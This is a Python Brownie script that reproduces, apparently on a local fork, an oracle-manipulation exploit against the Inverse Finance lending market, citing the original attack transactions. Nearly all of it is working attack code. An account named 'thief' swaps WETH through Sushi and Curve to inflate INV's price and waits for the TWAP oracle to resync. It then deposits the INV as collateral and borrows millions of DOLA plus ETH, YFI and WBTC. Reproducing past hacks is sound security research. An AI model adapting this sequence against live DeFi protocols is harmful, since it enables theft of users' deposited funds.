from brownie import accounts, chain, Contract

# Swap 500 ETH to INV in #14506358 https://etherscan.io/tx/0x20a6dcff06a791a7f8be9f423053ce8caee3f9eecc31df32445fc98d4ccd8365
# Hack Inverse in #14506359 https://etherscan.io/tx/0x600373f67521324c8068cfd025f121a0843d57ec813411661b07edc5ff781842

# assets
weth = Contract.from_explorer("0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2")
inv = Contract.from_explorer("0x41D5D79431A913C4aE7d69a668ecdfE5fF9DFB68")
dola = Contract.from_explorer("0x865377367054516e17014CcdED1e7d814EDC9ce4")
usdc = Contract.from_explorer("0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48")
wbtc = Contract.from_explorer("0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599")
yfi = Contract.from_explorer("0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e")

sushi_router = Contract.from_explorer(
    "0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F")
inv_weth_pair = Contract.from_explorer(
    "0x328dfd0139e26cb0fef7b0742b49b0fe4325f821")

oracle = Contract.from_explorer("0xE8929AFd47064EfD36A7fB51dA3F8C5eb40c4cb4")
keep_3r_v2_oracle_factory = Contract.from_explorer(
    "0xd14439b3a7245d8ea92e37b77347014ea7e4f809")
keep_3r_v2_feed = Contract.from_explorer(
    "0x39b1df026010b5aea781f90542ee19e900f2db15")
eth_feed = Contract.from_explorer("0x5f4ec3df9cbd43714fe2740f5e3616155c5b8419")

curve_pool = Contract.from_explorer(
    "0xAA5A67c256e27A5d80712c51971408db3370927D")

# Inverse Contracts
comptroller = Contract.from_explorer(
    "0x4dCf7407AE5C07f8681e1659f626E114A7667339")
# cTokens
xinv = Contract.from_explorer("0x1637e4e9941D55703a7A5E7807d6aDA3f7DCD61B")
anwbtc = Contract.from_explorer("0x17786f3813E6bA35343211bd8Fe18EC4de14F28b")
anyfi = Contract.from_explorer("0xde2af899040536884e062D3a334F2dD36F34b4a4")
aneth = Contract.from_explorer("0x697b4acAa24430F254224eB794d2a85ba1Fa1FB8")
andola = Contract.from_explorer("0x7Fcb7DAC61eE35b3D4a51117A7c58D53f0a8a670")


def print_prices():
    print(
        f'INV-WETH price:    {format_amount(keep_3r_v2_feed.current(inv, 1e18, weth)[0], 18)}'
    )
    print(
        f'ETH oracle price:  {format_amount(eth_feed.latestAnswer(), 8)}'
    )
    print(
        f'INV oracle price:  {format_amount(oracle.getUnderlyingPrice(xinv), 18)}'
    )
    # print('4 >>', inv_weth_pair.getReserves())
    # print('5 >>', inv_weth_pair.price0CumulativeLast())
    # print('6 >>', inv_weth_pair.price1CumulativeLast())
    print('')


def format_amount(amount, decimals):
    return amount / 10**decimals

# Reproduce hack


thief = accounts[0]


def hack_inverse():
    print('Mint 500 WETH to thief\n')
    weth.deposit({'from': thief, 'value': 500 * 10**18})

    print('Sync INV-WETH pair and oracle feed to update blockchain timestamp in contracts store\n')
    inv_weth_pair.sync({'from': accounts[0]})
    keep_3r_v2_oracle_factory.workForFree(inv_weth_pair, {'from': accounts[0]})

    print_prices()

    print('INV price manipulation\n')

    print('Swap 200 WETH to UDSC\n')
    weth.approve(sushi_router, 200 * 10**18, {'from': thief})
    sushi_router.swapExactTokensForTokens(
        200 * 10**18, 0, [weth, usdc], thief, chain.time() + 1000, {'from': thief})
    usdc_amount_out = usdc.balanceOf(thief)
    print(f'Received {format_amount(usdc_amount_out, usdc.decimals())} USDC\n')

    print('Swap USDC to DOLA via Curve\n')
    usdc.approve(curve_pool, usdc_amount_out, {'from': thief})
    curve_pool.exchange_underlying(2, 0, usdc_amount_out, 0, {'from': thief})
    dola_amount_out = dola.balanceOf(thief)
    print(f'Received {format_amount(dola_amount_out, dola.decimals())} DOLA\n')

    print('Swap DOLA to INV\n')
    dola.approve(sushi_router, dola_amount_out, {'from': thief})
    sushi_router.swapExactTokensForTokens(
        dola_amount_out, 0, [dola, inv], thief, chain.time() + 1000, {'from': thief})
    inv_amount_out_1 = inv.balanceOf(thief)
    print(f'Received {format_amount(inv_amount_out_1, inv.decimals())} INV\n')

    print('Swap 300 WETH to INV\n')
    weth.approve(sushi_router, 300 * 10**18, {'from': thief})
    sushi_router.swapExactTokensForTokens(
        300 * 10**18, 0, [weth, inv], thief, chain.time() + 1000, {'from': thief})
    inv_amount_out_2 = inv.balanceOf(thief) - inv_amount_out_1
    print(f'Received {format_amount(inv_amount_out_2, inv.decimals())} INV\n')

    start_time = chain.time()
    time_to_resync_pair = start_time + 15

    print_prices()

    now = chain.time()
    if (now < time_to_resync_pair):
        print(
            f'Sleep on {time_to_resync_pair - now} seconds. We should resync the pair after 15 second of the last sync\n'
        )
        chain.sleep(time_to_resync_pair - now)

    print('Resync INV-WETH pair\n')
    inv_weth_pair.sync({'from': accounts[0]})

    print_prices()

    total_inv_balance = inv_amount_out_1 + inv_amount_out_2
    print(
        f'Deposit {format_amount(total_inv_balance, inv.decimals())} INV as collateral\n'
    )
    comptroller.enterMarkets([xinv, anwbtc, anyfi, aneth], {'from': thief})
    inv.approve(xinv, inv_amount_out_1 + inv_amount_out_2, {'from': thief})
    xinv.mint(inv_amount_out_1 + inv_amount_out_2, {'from': thief})

    print('Borrow a bunch of tokens using manipulated collateral\n')
    tx1 = andola.borrow(3999669 * 10**18, {'from': thief})
    tx1.info()
    tx2 = aneth.borrow(1588 * 10**18, {'from': thief})
    tx2.info()
    tx3 = anyfi.borrow(39 * 10**18, {'from': thief})
    tx3.info()
    tx4 = anwbtc.borrow(94 * 10**8, {'from': thief})
    tx4.info()


def main():
    chain.snapshot()
